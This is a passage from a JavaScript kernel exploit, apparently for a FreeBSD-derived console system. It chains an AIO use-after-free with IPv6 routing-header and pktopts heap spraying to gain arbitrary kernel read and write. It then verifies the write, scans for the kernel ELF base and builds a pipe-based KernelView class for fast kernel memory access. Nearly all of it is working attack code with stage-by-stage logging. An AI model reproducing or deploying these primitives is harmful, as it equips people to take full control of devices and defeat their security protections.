                for (let r = 0; r < EVF_ATTEMPTS && dirty2 < 0; ++r) {
                    for (let i = 0; i < ipv6Socks.length; ++i) {
                        sc(SYS.setsockopt, ipv6Socks[i], IPPROTO_IPV6, IPV6_RTHDR,
                            sprayRthdr.addr, sprayRthdrLen);
                    }
                    for (let o = 0; o < total2 && dirty2 < 0; o += AIO_MAX_NUM) {
                        for (let z = 0; z < AIO_MAX_NUM; ++z)
                            outs.dv.setInt32(z * 4, -1, true);
                        sc(SYS.aio_multi_cancel, aioIds2.addr.add32(o * 4),
                            AIO_MAX_NUM, outs.addr);
                        let reqIdx = -1;
                        for (let z = 0; z < AIO_MAX_NUM; ++z)
                            if (outs.dv.getUint32(z * 4, true) === AIO_STATE_COMPLETE) {
                                reqIdx = z; break;
                            }
                        if (reqIdx < 0) continue;
                        const abs = o + reqIdx;
                        reqId = aioIds2.dv.getUint32(abs * 4, true);

                        sc(SYS.aio_multi_poll, aioIds2.addr.add32(abs * 4), 1, outs.addr);
                        aioIds2.dv.setUint32(abs * 4, 0, true);
                        for (let k = 0; k < ipv6Socks.length; ++k) {
                            if (getRthdr(ipv6Socks[k], 0x80) === -1) continue;
                            if (leakRthdr.dv.getUint8(REQS3_OFF + AR3_DONE) !== 0) {
                                dirty2 = ipv6Socks[k];

                                twinSocks.push(dirty2);
                                ipv6Socks.splice(k, 1);
                                for (let m = 0; m < ipv6Socks.length; ++m)
                                    sc(SYS.setsockopt, ipv6Socks[m], IPPROTO_IPV6,
                                        IPV6_RTHDR, 0, 0);
                                const ns = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
                                if (ns !== -1) ipv6Socks.push(ns);
                                mark("BATCH-OVERWRITTEN", "req_id=" + hx(reqId)
                                    + " dirty_fd=" + dirty2 + " after " + r
                                    + " round(s)");
                                break;
                            }
                        }
                    }
                }
                if (!check("crafted-aio-queue-entry-installed", dirty2 >= 0,
                        dirty2 >= 0 ? "" : "never observed ar3_done being set"))
                    return false;

                processBatches(false, true, true);

                const targetIds = alloc(8);
                targetIds.dv.setUint32(0, reqId, true);
                targetIds.dv.setUint32(4, targetId, true);
                sc(SYS.aio_multi_poll, targetIds.addr.add32(4), 1, outs.addr);
                mark("TARGET-ARMED", "req_id=" + hx(reqId) + " target_id="
                    + hx(targetId) + " -- both deletes now free the same 0x100 "
                    + "allocation");

                committed2 = true;

                const tDel = Date.now();
                sc(SYS.aio_multi_delete, targetIds.addr, 2, outs.addr);
                const delMs = Date.now() - tDel;
                const derr0 = outs.dv.getUint32(0, true);
                const derr1 = outs.dv.getUint32(4, true);
                if (delMs > 300)
                    mark("DELETE-SLOW", "aio_multi_delete of the target pair took "
                        + delMs + " ms. Normal is under 100. The 0x100 chunk has "
                        + "been free and unclaimed for that whole time, so the "
                        + "reclaim below is likely to fail -- and if it does, "
                        + "that is the reason, not the spray.");

                let ptwins = null;
                const tclass = alloc(4), tclassLen = alloc(4);
                for (let r = 0; r < EVF_ATTEMPTS && !ptwins; ++r) {
                    for (let i = 0; i < ipv6Socks.length; ++i)
                        sc(SYS.setsockopt, ipv6Socks[i], IPPROTO_IPV6,
                            IPV6_2292PKTOPTIONS, 0, 0);
                    for (let i = 0; i < ipv6Socks.length; ++i) {
                        tclass.dv.setInt32(0, i, true);
                        sc(SYS.setsockopt, ipv6Socks[i], IPPROTO_IPV6,
                            IPV6_TCLASS, tclass.addr, 4);
                    }
                    for (let j = 0; j < ipv6Socks.length; ++j) {
                        tclassLen.dv.setInt32(0, 4, true);
                        if (sc(SYS.getsockopt, ipv6Socks[j], IPPROTO_IPV6,
                                IPV6_TCLASS, tclass.addr, tclassLen.addr).i32 === -1)
                            continue;
                        const idx = tclass.dv.getInt32(0, true);
                        if (idx === j || idx < 0 || idx >= ipv6Socks.length) continue;
                        if (ipv6Socks[idx] === ipv6Socks[j]) { dupSeen++; continue; }
                        ptwins = { round: r, a: ipv6Socks[j], b: ipv6Socks[idx] };
                        const hi2 = Math.max(j, idx), lo2 = Math.min(j, idx);
                        ipv6Socks.splice(hi2, 1);
                        ipv6Socks.splice(lo2, 1);
                        for (let m = 0; m < 2; ++m) {
                            const ns = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
                            if (ns === -1) continue;
                            tclass.dv.setInt32(0, ipv6Socks.length, true);
                            sc(SYS.setsockopt, ns, IPPROTO_IPV6, IPV6_TCLASS,
                                tclass.addr, 4);
                            ipv6Socks.push(ns);
                        }
                        break;
                    }
                }
                mark("DELETE-ERRS", hx(derr0) + "," + hx(derr1)
                    + "   (" + delMs + " ms)");
                check("target-deletes-reported-success",
                    derr0 === 0 && derr1 === 0, hx(derr0) + "," + hx(derr1));
                if (ptwins && ptwins.a === ptwins.b) {
                    mark("FALSE-TWINS", "both pktopts twins are fd " + ptwins.a
                        + " -- that is one socket seen twice, not an aliased "
                        + "allocation. refusing to build a read primitive on it.");
                    ptwins = null;
                }
                if (!check("0x100-chunk-reclaimed-pktopts", !!ptwins,
                        ptwins ? ("pktopts twins are fds " + ptwins.a + " and "
                                  + ptwins.b + " after " + ptwins.round + " round(s)")
                               : "no pktopts twins found -- the 0x100 chunk is "
                                 + "dangling, reboot now"))
                    return false;

                pktoptsTwins.push(ptwins.a, ptwins.b);
                mark("STAGE-3-DONE", "pktopts twins fds "
                    + pktoptsTwins.join(" and ")
                    + " alias one 0x100 allocation. make_karw is step 4i, and "
                    + "it is the first point where any of this can be repaired.");

                state("stage 4: kernel read...", "warn");

                sprayRthdr.u8.fill(0);
                const karwLen = buildRthdr(sprayRthdr, 0x100);
                const pktinfoSelf = reqs1Aligned.add32(PKTOPTS_PKTINFO);
                put(sprayRthdr.dv, PKTOPTS_PKTINFO, pktinfoSelf);
                mark("KARW-SPRAY", "rthdr len 0x" + karwLen.toString(16)
                    + ", ip6po_pktinfo -> itself at " + pktinfoSelf);

                if (sc(SYS.close, pktoptsTwins[1]).i32 === -1) {
                    check("second-pktopts-twin-closed", false,
                        "fd " + pktoptsTwins[1]);
                    return false;
                }
                mark("PKTOPTS-TWIN-CLOSED", "fd " + pktoptsTwins[1]
                    + " freed the pktopts; fd " + pktoptsTwins[0]
                    + " still points at it");

                const tcBuf = alloc(4), tcLen = alloc(4);
                let karwSock = -1;
                for (let r = 0; r < EVF_ATTEMPTS && karwSock < 0; ++r) {
                    for (let i = 0; i < ipv6Socks.length; ++i) {
                        sprayRthdr.dv.setUint32(PKTOPTS_TCLASS,
                            ((i << 0x10) | KARW_MARKER) >>> 0, true);
                        sc(SYS.setsockopt, ipv6Socks[i], IPPROTO_IPV6,
                            IPV6_RTHDR, sprayRthdr.addr, karwLen);
                    }
                    tcLen.dv.setInt32(0, 4, true);
                    if (sc(SYS.getsockopt, pktoptsTwins[0], IPPROTO_IPV6,
                            IPV6_TCLASS, tcBuf.addr, tcLen.addr).i32 === -1)
                        continue;
                    const marker = tcBuf.dv.getUint32(0, true) >>> 0;
                    if ((marker & 0xffff) === KARW_MARKER) {
                        const which = marker >>> 0x10;
                        if (which < ipv6Socks.length) {
                            karwSock = ipv6Socks[which];
                            ipv6Socks.splice(which, 1);
                            mark("PKTOPTS-OVERWRITTEN", "fd " + karwSock
                                + " now backs fd " + pktoptsTwins[0]
                                + "'s pktopts, after " + r + " round(s)");
                        }
                    }
                }
                if (!check("rthdr-sprayed-live-pktopts",
                        karwSock >= 0,
                        karwSock >= 0 ? "" : "the 0x1337 marker never appeared "
                        + "in IPV6_TCLASS")) return false;
                pktoptsTwins[1] = karwSock;

                const pktinfo = alloc(0x14), nhopLen = alloc(4), kbuf = alloc(0x20);
                let kreadCalls = 0, kreadFail = 0;

                let kwriteCalls = 0;

                function pktinfoSet(fill) {
                    kwriteCalls++;
                    pktinfo.u8.fill(0);
                    fill(pktinfo.dv);
                    return sc(SYS.setsockopt, pktoptsTwins[0], IPPROTO_IPV6,
                        IPV6_PKTINFO, pktinfo.addr, 0x14).i32;
                }

                function pktinfoGet() {
                    pktinfo.u8.fill(0);
                    optLen.dv.setInt32(0, 0x14, true);
                    const r = sc(SYS.getsockopt, pktoptsTwins[0], IPPROTO_IPV6,
                        IPV6_PKTINFO, pktinfo.addr, optLen.addr).i32;
                    return r === 0 ? new int64(pktinfo.dv.getUint32(0, true),
                                               pktinfo.dv.getUint32(4, true))
                                   : null;
                }

                function kread8(addr) {
                    kreadCalls++;
                    let off = 0;
                    kbuf.u8.fill(0);
                    while (off < 8) {
                        pktinfo.u8.fill(0);
                        put(pktinfo.dv, 0, pktinfoSelf);
                        put(pktinfo.dv, 8, addr.add32(off));
                        if (sc(SYS.setsockopt, pktoptsTwins[0], IPPROTO_IPV6,
                                IPV6_PKTINFO, pktinfo.addr, 0x14).i32 === -1) {
                            kreadFail++; return null;
                        }
                        nhopLen.dv.setInt32(0, 8 - off, true);
                        if (sc(SYS.getsockopt, pktoptsTwins[0], IPPROTO_IPV6,
                                IPV6_NEXTHOP, kbuf.addr.add32(off),
                                nhopLen.addr).i32 === -1) {
                            kreadFail++; return null;
                        }
                        const n = nhopLen.dv.getInt32(0, true);
                        if (n === 0) { kbuf.dv.setUint8(off, 0); off += 1; }
                        else off += n;
                    }
                    return new int64(kbuf.dv.getUint32(0, true),
                                     kbuf.dv.getUint32(4, true));
                }

                const cvWord = kread8(evfCv);
                let kstr = "";
                if (cvWord) {
                    for (let i = 0; i < 8; ++i) {
                        const c = kbuf.dv.getUint8(i);
                        if (c === 0) break;
                        kstr += String.fromCharCode(c);
                    }
                }
                mark("KREAD-EVF-CV", evfCv + " -> " + (cvWord || "FAILED")
                    + "  as text: '" + kstr + "'");
                if (!check("kernel-memory-reads-string-evf",
                        kstr === "evf cv", "got '" + kstr + "'")) return false;

                const myPid = sc(SYS.getpid).i32;
                let curproc = null, curprocFrom = "none";

                if (kLeakFp) {
                    const pipeL = kread8(kLeakFp);

                    let cnt = null, sz = null, buf = null;
                    if (pipeL && kptr(pipeL)) {
                        cnt = kread8(pipeL);
                        sz = kread8(pipeL.add32(8));
                        buf = kread8(pipeL.add32(0x10));
                    }
                    const readEnd = !!buf && kptr(buf) && !!sz && sz.hi === 0x4000;
                    const writeEnd = !!buf && buf.low === 0 && buf.hi === 0
                        && !!sz && sz.low === 0 && sz.hi === 0;
                    mark("SIGIO-PIPE", "ar2_file " + kLeakFp + " -> f_data "
                        + (pipeL || "?") + "   pipebuf cnt|in=" + (cnt || "?")
                        + " out|size=" + (sz || "?") + " buffer=" + (buf || "?")
                        + "   looks like " + (readEnd ? "a read end"
                            : writeEnd ? "a write end (no buffer of its own, "
                                + "which is what pipe_create(wpipe, 0) makes)"
                            : "neither"));

                    if (pipeL && kptr(pipeL)) {

                        const sigBefore = kread8(pipeL.add32(0xd0));
                        const pidBuf = alloc(4);
                        pidBuf.dv.setInt32(0, myPid, true);
                        const io = sc(SYS.ioctl, leakPipe[1], FIOSETOWN,
                            pidBuf.addr).i32;
                        const sigAfter = io === 0
                            ? kread8(pipeL.add32(0xd0)) : null;
                        mark("SIGIO-WALK", "ioctl(FIOSETOWN)=" + io
                            + "  pipe_sigio before=" + (sigBefore || "?")
                            + " after=" + (sigAfter || "?"));
                        const appeared = !!sigBefore && sigBefore.low === 0
                            && sigBefore.hi === 0 && !!sigAfter && kptr(sigAfter);
                        check("pipe_sigio-null-became-kernel-pointer"
                            + "exactly when FIOSETOWN was called", appeared,
                            appeared ? "so ar2_file+0 is f_data and +0xd0 is "
                                + "pipe_sigio, both confirmed by a transition "
                                + "we caused"
                                : "no transition, so this walk is not trusted");

                        if (appeared) {
                            const cand = kread8(sigAfter);
                            const pid2 = (cand && kptr(cand))
                                ? kread8(cand.add32(0xb0)) : null;
                            const ok = !!pid2 && pid2.low === myPid && pid2.hi === 0;
                            mark("SIGIO-PID", "sigio->proc=" + (cand || "?")
                                + "  p_pid=" + (pid2 ? pid2.low : "?")
                                + " getpid=" + myPid);
                            check("proc-sigio-names-proc", ok,
                                ok ? "p_pid matches getpid(), so this is curproc "
                                    + "-- with no aio_info anywhere in the path"
                                    : "p_pid " + (pid2 ? pid2.low : "?")
                                    + " -- rejected");
                            if (ok) { curproc = cand; curprocFrom = "sigio"; }
                        }
                    }
                }

                let aioCurproc = null;
                for (let t = 0; t < 5 && !(aioCurproc && kptr(aioCurproc)); ++t) {
                    aioCurproc = kread8(aioInfoAddr.add32(8));
                    if (aioCurproc && kptr(aioCurproc)) break;
                    preTs.u8.fill(0);
                    preTs.dv.setUint32(8, 2000000, true);
                    sc(SYS.nanosleep, preTs.addr, 0);
                }
                mark("KREAD-CURPROC", "aio_info+8 = "
                    + (aioCurproc ? aioCurproc.toString() : "FAILED")
                    + (aioCurproc && kptr(aioCurproc) ? "  (kernel pointer)"
                        : "  (NOT a kernel pointer -- ar2_info was reclaimed)"));
                if (aioCurproc && kptr(aioCurproc) && !curproc) {
                    curproc = aioCurproc; curprocFrom = "aio_info";
                }
                if (curproc && aioCurproc && kptr(aioCurproc))
                    check("curproc-routes-agree",
                        sameI64(curproc, aioCurproc),
                        curprocFrom === "sigio"
                            ? "sigio " + curproc + " vs aio_info " + aioCurproc
                            : "");

                if (!(curproc && kptr(curproc))) {
                    mark("CURPROC-UNAVAILABLE", "neither route produced a proc. "
                        + "ar2_file=" + (kLeakFp || "null") + ", aio_info at "
                        + aioInfoAddr + " reads " + (aioCurproc || "null")
                        + ". This gates the ofiles walk only; the kernel WRITE "
                        + "below is unaffected.");
                } else {
                    mark("CURPROC", curproc + " via " + curprocFrom);
                }
                const haveCurproc = !!(curproc && kptr(curproc));
                if (haveCurproc) {
                    check("curproc-kernel-pointer", true, curproc.toString());
                    const pPid = kread8(curproc.add32(0xb0));
                    mark("KREAD-PID", "p_pid=" + (pPid ? pPid.low : "?")
                        + " getpid=" + myPid);
                    check("pid-read-kernel-matches-getpid",
                        !!pPid && pPid.low === myPid && pPid.hi === 0,
                        (pPid ? pPid.low : "?") + " vs " + myPid);

                    const pFd = kread8(curproc.add32(0x48));
                    const fdtOfiles = pFd ? kread8(pFd) : null;
                    mark("KREAD-FDT", "p_fd=" + (pFd || "?")
                        + " fdt_ofiles=" + (fdtOfiles || "?"));
                    check("file-descriptor-table-reachable",
                        !!fdtOfiles && kptr(fdtOfiles),
                        fdtOfiles ? fdtOfiles.toString() : "null");

                    if (kLeakFp && fdtOfiles && kptr(fdtOfiles)) {
                        const slot = kread8(fdtOfiles.add32(leakPipe[1] * 8));
                        const match = !!slot && sameI64(slot, kLeakFp);
                        mark("OFILES-CROSSCHECK", "ofiles[" + leakPipe[1] + "] = "
                            + (slot || "?") + "   ar2_file said " + kLeakFp);
                        check("ofiles-table-contains-struct-file"
                            + "stage 2 leaked", match,
                            match ? "so fdt_ofiles is correct and entries are 8 "
                                + "bytes apart, not FreeBSD's 0x30"
                                : "the table, the stride, or curproc is wrong");
                    }

                    if (fdtOfiles && kptr(fdtOfiles) && pipesOk) {
                        const FILEDESCENT_SIZE = 8;
                        function pipeFData(fd) {
                            const fp = kread8(fdtOfiles.add32(fd * FILEDESCENT_SIZE));
                            if (!fp || !kptr(fp)) return null;
                            const d = kread8(fp);
                            return (d && kptr(d)) ? { fp: fp, data: d } : null;
                        }
                        const m = pipeFData(masterPipe[0]);
                        const sl = pipeFData(slavePipe[0]);
                        mark("PIPE-FILE", "master fd " + masterPipe[0] + " file="
                            + (m ? m.fp : "?") + " f_data=" + (m ? m.data : "?"));
                        mark("PIPE-FILE", "slave  fd " + slavePipe[0] + " file="
                            + (sl ? sl.fp : "?") + " f_data=" + (sl ? sl.data : "?"));
                        const both = !!m && !!sl && m.data.low !== sl.data.low;

                        if (both) {
                            pipeM = m.data; pipeS = sl.data;
                            pipeMFp = m.fp; pipeSFp = sl.fp;
                            kFdtOfiles = fdtOfiles;
                        }
                        check("pipes-struct-pipe-addresses-read",
                            both, both ? "" : "one of them did not resolve");
                        if (both) {

                            const pb = [];
                            for (let o = 0; o < 0x18; o += 8)
                                pb.push(kread8(m.data.add32(o)));
                            mark("PIPEBUF", "master pipebuf now: "
                                + pb.map(function (x) { return x ? x.toString() : "?"; })
                                    .join(" "));
                        }
                    } else if (!pipesOk) {
                        mark("PIPE-WALK-SKIPPED", "no pipe pairs to walk");
                    }
                } else {
                    mark("FDT-WALK-SKIPPED", "no live curproc, so the ofiles "
                        + "walk cannot run. That walk is only needed for the "
                        + "PIPE route to fast R/W -- the write primitive below "
                        + "comes out of ip6po_pktinfo and needs none of it.");
                }

                mark("KREAD-STATS", kreadCalls + " kread8 calls, "
                    + kreadFail + " failed");

                state("stage 5: kernel write...", "warn");

                const kwTarget = pktinfoSelf.sub32(8);
                const KW_A = 0x4b571337, KW_B = 0xfeedc0de;

                const before = kread8(kwTarget);
                mark("KWRITE-TARGET", kwTarget + " currently holds "
                    + (before || "unreadable"));

                const aimRc = pktinfoSet(function (dv) {
                    put(dv, 0, kwTarget);
                    put(dv, 8, new int64(0, 0));
                });
                const seen = pktinfoGet();
                const aimOk = aimRc === 0 && seen !== null && before !== null
                    && seen.low === before.low && seen.hi === before.hi;
                mark("KWRITE-AIM", "ip6po_pktinfo -> " + kwTarget
                    + " (setsockopt=" + aimRc + "); reading back through it "
                    + "gives " + (seen || "null") + ", target held " + (before || "?"));
                check("write-pointer-landed-where-aimed", aimOk,
                    aimOk ? "" : "getsockopt(IPV6_PKTINFO) does not match an "
                        + "independent kread8 of the target -- NOT writing");

                if (!aimOk) {

                    for (let r = 0; r < 8; ++r) {
                        put(sprayRthdr.dv, PKTOPTS_PKTINFO, pktinfoSelf);
                        for (let i = 0; i < ipv6Socks.length; ++i)
                            sc(SYS.setsockopt, ipv6Socks[i], IPPROTO_IPV6,
                                IPV6_RTHDR, sprayRthdr.addr, karwLen);
                        const c = kread8(evfCv);
                        if (c && kbuf.dv.getUint8(0) === 0x65) break;
                    }
                    mark("KWRITE-ABORTED", "aim=unconfirmed write=none "
                        + "selfref=restored");
                } else {

                    const wrc = pktinfoSet(function (dv) {
                        dv.setUint32(0, KW_A, true);
                        dv.setUint32(4, KW_B, true);
                        put(dv, 8, pktinfoSelf);
                    });
                    const back = kread8(kwTarget);
                    const wroteOk = wrc === 0 && back !== null
                        && back.low === KW_A && back.hi === KW_B;
                    mark("KWRITE", "wrote " + hx(KW_B) + hx(KW_A).slice(2)
                        + " at " + kwTarget + " (setsockopt=" + wrc
                        + "), kread8 returns " + (back || "unreadable"));
                    check("arbitrary-kernel-address-took-20",
                        wroteOk, wroteOk ? "" : "read back " + (back || "null"));

                    const cvAgain = kread8(evfCv);
                    let kstr2 = "";
                    if (cvAgain) for (let i = 0; i < 8; ++i) {
                        const c = kbuf.dv.getUint8(i);
                        if (c === 0) break;
                        kstr2 += String.fromCharCode(c);
                    }
                    check("read-primitive-survives-write", kstr2 === "evf cv",
                        "'" + kstr2 + "' after " + kwriteCalls + " pktinfo writes");
                    check("ip6po_pktinfo-not-left-interior",
                        kstr2 === "evf cv",
                        "a dangling interior pointer here is a free() of a "
                        + "non-allocation at teardown -- that is what panicked "
                        + "the last run");

                    if (wroteOk && kstr2 === "evf cv")
                        mark("KERNEL-RW", "read=ok write=ok via=pktopts "
                            + "aim=verified selfref=restored");
                }

                state("stage 6: locating the kernel base...", "warn");
                const KSTR_RESIDUE = evfCv.low & 0x3fff;
                const KSTR_LO = params.has("kstrlo")
                    ? parseInt(params.get("kstrlo"), 16) : 0x780000;
                const KSTR_HI = params.has("kstrhi")
                    ? parseInt(params.get("kstrhi"), 16) : 0x800000;
                const ELF_MAGIC = 0x464c457f;

                mark("KSTR-PLAN", "residue=0x" + KSTR_RESIDUE.toString(16)
                    + " window=0x" + KSTR_LO.toString(16) + "..0x"
                    + KSTR_HI.toString(16) + " step=0x4000 order=ascending");
                if (KSTR_RESIDUE !== 0x26f)
                    mark("KSTR-RESIDUE-ODD", "expected 0x26f from the earlier "
                        + "runs but this one gives 0x" + KSTR_RESIDUE.toString(16)
                        + " -- the constraint may not hold, treat the result "
                        + "with suspicion");

                let first = KSTR_LO;
                while ((first & 0x3fff) !== KSTR_RESIDUE) first++;
                let kstrOff = -1, kbase = null, tried = 0, lastRead = null;
                for (let off = first; off <= KSTR_HI; off += 0x4000) {
                    const cand = evfCv.sub32(off);
                    const w = kread8(cand);
                    tried++;
                    lastRead = w;
                    if (!w) break;
                    if ((w.low >>> 0) === ELF_MAGIC) {
                        kstrOff = off; kbase = cand; break;
                    }
                }
                mark("KSTR-SCAN", tried + " candidate(s) tested, last read "
                    + (lastRead || "null")
                    + (kstrOff >= 0 ? "" : " -- no ELF header found"));

                if (kstrOff >= 0) {

                    const hdr = kread8(kbase.add32(0x10));
                    const eType = hdr ? (hdr.low & 0xffff) : -1;
                    const eMachine = hdr ? ((hdr.low >>> 16) & 0xffff) : -1;
                    const ident = kread8(kbase);
                    const eiClass = ident ? (ident.hi & 0xff) : -1;
                    mark("KERNEL-BASE", kbase + "   e_type=" + eType
                        + " e_machine=0x" + eMachine.toString(16)
                        + " ei_class=" + eiClass);
                    const hdrOk = (eType === 2 || eType === 3) && eMachine === 0x3e
                        && eiClass === 2;
                    check("elf-header-base-checks", hdrOk,
                        "want e_type 2 or 3, e_machine 0x3e, ei_class 2");
                    if (hdrOk) {
                        mark("OFF-KSTR", "0x" + kstrOff.toString(16)
                            + "   (evf_cv " + evfCv + " - kernel base " + kbase
                            + ")   residue 0x" + (kstrOff & 0x3fff).toString(16));
                        mark("OFF-KSTR-COMPARE", "known: 6.00 0x7da91c, 7.xx "
                            + "0x7f92cb, 8.xx 0x79a92e, 9.xx 0x7edcff, PSFree "
                            + "0x7f6f27 -- this one is 0x" + kstrOff.toString(16));
                        check("off_kstr for " + key + " recovered", true,
                            "0x" + kstrOff.toString(16)
                            + (off.k_evf_cv !== undefined
                                ? (kstrOff === off.k_evf_cv
                                    ? "   matches the table"
                                    : "   TABLE SAYS 0x" + off.k_evf_cv.toString(16))
                                : "   (no table value to compare)"));
                    }
                } else {
                    check("off_kstr for " + key + " recovered", false,
                        "no ELF header in the window -- either it is not mapped "
                        + "or off_kstr is outside 0x" + KSTR_LO.toString(16)
                        + "..0x" + KSTR_HI.toString(16)
                        + ". Widen with ?kstrlo=&kstrhi= only after deciding "
                        + "the overshoot is acceptable.");
                }

                if (pipeM && pipeS) {

                    let slowMs = 0, slowOk = 0;
                    {
                        const t0 = Date.now();
                        for (let i = 0; i < 32; ++i) if (kread8(evfCv)) slowOk++;
                        slowMs = Date.now() - t0;
                    }
                    const slowBps = Math.round(slowOk * 8 * 1000 / Math.max(1, slowMs));
                    mark("SLOW-READ-BENCH", slowOk + "/32 eight-byte reads via "
                        + "setsockopt+getsockopt in " + slowMs + " ms = "
                        + slowBps + " bytes/s");

                    let preflightOk = false;
                    {
                        const pat = alloc(0x18), got = alloc(0x18);
                        for (let i = 0; i < 0x18; ++i) pat.u8[i] = 0xa0 + i;
                        got.u8.fill(0);
                        const w = sc(SYS.write, masterPipe[1], pat.addr, 0x18).i32;
                        const midCnt = kread8(pipeM);
                        const r = sc(SYS.read, masterPipe[0], got.addr, 0x18).i32;
                        const endCnt = kread8(pipeM);
                        const endOut = kread8(pipeM.add32(8));
                        let same = w === 0x18 && r === 0x18;
                        for (let i = 0; same && i < 0x18; ++i)
                            same = got.u8[i] === pat.u8[i];
                        const reset = !!endCnt && endCnt.low === 0 && endCnt.hi === 0
                            && !!endOut && endOut.low === 0;
                        mark("PIPE-PREFLIGHT", "write=" + w + " read=" + r
                            + "  bytes identical=" + same
                            + "  pipebuf mid cnt|in=" + (midCnt || "?")
                            + "  end cnt|in=" + (endCnt || "?")
                            + "  end out|size=" + (endOut || "?"));
                        preflightOk = same && reset;
                        check("0x18-write-read-round-trips-master"
                            + "and leaves cnt/in/out at zero", preflightOk,
                            preflightOk ? "so flush() is repeatable"
                                : "flush() would walk forward through the buffer "
                                + "-- refusing to aim the pipebuf");
                    }

                    if (preflightOk) try {

                            const PIPEBUF_OUT = 8;
                            const PIPE_PAGE = 0x4000;
                            const PIPEBUF_SIZEOF = 0x18;
                            const outAddr = pipeM.add32(PIPEBUF_OUT);
                            const beforeOut = kread8(outAddr);

                            const aimRc = pktinfoSet(function (dv) {
                                put(dv, 0, outAddr);
                                put(dv, 8, new int64(0, 0));
                            });
                            const seenOut = pktinfoGet();
                            const aimOk = aimRc === 0 && seenOut && beforeOut
                                && seenOut.low === beforeOut.low
                                && seenOut.hi === beforeOut.hi;
                            mark("FASTRW-AIM", "ip6po_pktinfo -> " + outAddr
                                + "; through it reads " + (seenOut || "null")
                                + ", kread8 said " + (beforeOut || "?"));
                            check("pipebuf-aim-confirmed-before-writing",
                                aimOk, aimOk ? "" : "NOT writing");

                            if (aimOk) {

                                const wRc = pktinfoSet(function (dv) {
                                    dv.setUint32(0, 0, true);
                                    dv.setUint32(4, PIPE_PAGE, true);
                                    put(dv, 8, pipeS);
                                });
                                mark("FASTRW-WRITE", "master pipebuf <- out=0 size=0x"
                                    + PIPE_PAGE.toString(16) + " buffer=" + pipeS
                                    + " (setsockopt=" + wRc + ")");

                            pktinfo.u8.fill(0);
                            optLen.dv.setInt32(0, 0x14, true);
                            sc(SYS.getsockopt, pktoptsTwins[0], IPPROTO_IPV6,
                                IPV6_PKTINFO, pktinfo.addr, optLen.addr);
                            const gotSize = pktinfo.dv.getUint32(4, true);
                            const gotBuf = new int64(pktinfo.dv.getUint32(8, true),
                                                     pktinfo.dv.getUint32(12, true));
                            mark("FASTRW-READBACK", "pipebuf out="
                                + pktinfo.dv.getUint32(0, true) + " size=0x"
                                + gotSize.toString(16) + " buffer=" + gotBuf
                                + "   want buffer=" + pipeS);
                            const shaped = gotSize === PIPE_PAGE
                                && gotBuf.low === pipeS.low && gotBuf.hi === pipeS.hi;
                            check("master-pipe-buffer-points-slave",
                                shaped, "");

                            if (shaped) {

                                for (let i = openFds.length - 1; i >= 0; --i)
                                    if (openFds[i] === masterPipe[0]
                                        || openFds[i] === masterPipe[1]
                                        || openFds[i] === slavePipe[0]
                                        || openFds[i] === slavePipe[1])
                                        openFds.splice(i, 1);
                                mark("PIPES-PINNED", "master " + masterPipe
                                    + " and slave " + slavePipe + " taken off "
                                    + "the cleanup list -- closing master would "
                                    + "kmem_free slave's struct pipe");

                                state("building KernelView...", "warn");

                                function toI64(v) {
                                    return (typeof v === "number")
                                        ? new int64(v >>> 0, v < 0 ? 0xffffffff : 0)
                                        : v;
                                }

                                class KernelView {
                                    constructor(masterPipeFds, slavePipeFds) {
                                        if (!Array.isArray(masterPipeFds)
                                            || masterPipeFds.length !== 2)
                                            throw new Error("pipe should have 2 fds for r/w");
                                        if (!Array.isArray(slavePipeFds)
                                            || slavePipeFds.length !== 2)
                                            throw new Error("pipe should have 2 fds for r/w");

                                        this.view = alloc(8);
                                        this.masterPipe = masterPipeFds.slice();
                                        this.slavePipe = slavePipeFds.slice();

                                        const fds = [this.masterPipe[0], this.masterPipe[1],
                                                     this.slavePipe[0], this.slavePipe[1]];
                                        for (let i = 0; i < fds.length; ++i)
                                            if (sc(SYS.fcntl, fds[i], F_SETFL,
                                                   O_NONBLOCK).i32 === -1)
                                                throw new Error("Unable to fcntl fd " + fds[i]);

                                        this.pipeBuf = alloc(PIPEBUF_SIZEOF);
                                        this.pipeBuf.u8.fill(0);
                                        this.pipeBuf.dv.setUint32(0x0c, PIPE_PAGE, true);
                                        this.flushes = 0;
                                        this.bytesRead = 0;
                                        this.bytesWritten = 0;
                                    }

                                    free() {  }

                                    get dvBacking() { return this.view.addr; }

                                    get pipeBacking() {
                                        return new int64(this.pipeBuf.dv.getUint32(0x10, true),
                                                         this.pipeBuf.dv.getUint32(0x14, true));
                                    }

                                    set pipeBacking(addr) {
                                        if (addr.low === 0 && addr.hi === 0)
                                            throw new Error("Empty addr !!");
                                        put(this.pipeBuf.dv, 0x10, addr);
                                    }

                                    get pipeCount() {
                                        return this.pipeBuf.dv.getUint32(0, true);
                                    }

                                    set pipeCount(count) {
                                        if (count < 0 || count > 0xffffffff)
                                            throw new RangeError("count " + count
                                                + " out of range !!");
                                        this.pipeBuf.dv.setUint32(0, count >>> 0, true);
                                    }

                                    flush() {
                                        this.flushes++;
                                        if (sc(SYS.write, this.masterPipe[1],
                                               this.pipeBuf.addr, PIPEBUF_SIZEOF).i32 === -1)
                                            throw new Error("Unable to write to fd "
                                                + this.masterPipe[1] + " !!");
                                        if (sc(SYS.read, this.masterPipe[0],
                                               this.pipeBuf.addr, PIPEBUF_SIZEOF).i32 === -1)
                                            throw new Error("Unable to read from fd "
                                                + this.masterPipe[0] + " !!");
                                    }

                                    kread(dst, src, size) {
                                        this.pipeBacking = src;
                                        this.pipeCount = size;
                                        this.flush();

                                        const n = sc(SYS.read, this.slavePipe[0],
                                                     dst, size).i32;
                                        if (n === -1)
                                            throw new Error("Unable to read from fd "
                                                + this.slavePipe[0] + " !!");
                                        this.bytesRead += n;
                                        return n;
                                    }

                                    kwrite(dst, src, size) {
                                        this.pipeBacking = dst;
                                        this.pipeCount = size;
                                        this.flush();

                                        const n = sc(SYS.write, this.slavePipe[1],
                                                     src, size).i32;
                                        if (n === -1)
                                            throw new Error("Unable to write to fd "
                                                + this.slavePipe[1] + " !!");
                                        this.bytesWritten += n;
                                        return n;
                                    }

                                    getFloat32(byteOffset, littleEndian = false) {
                                        this.view.u8.fill(0);
                                        this.kread(this.dvBacking,
                                                   this.pipeBacking.add32(byteOffset), 4);
                                        return this.view.dv.getFloat32(0, littleEndian);
                                    }

                                    getFloat64(byteOffset, littleEndian = false) {
                                        this.kread(this.dvBacking,
                                                   this.pipeBacking.add32(byteOffset), 8);
                                        return this.view.dv.getFloat64(0, littleEndian);
                                    }

                                    getInt8(byteOffset) {
                                        this.view.u8.fill(0);
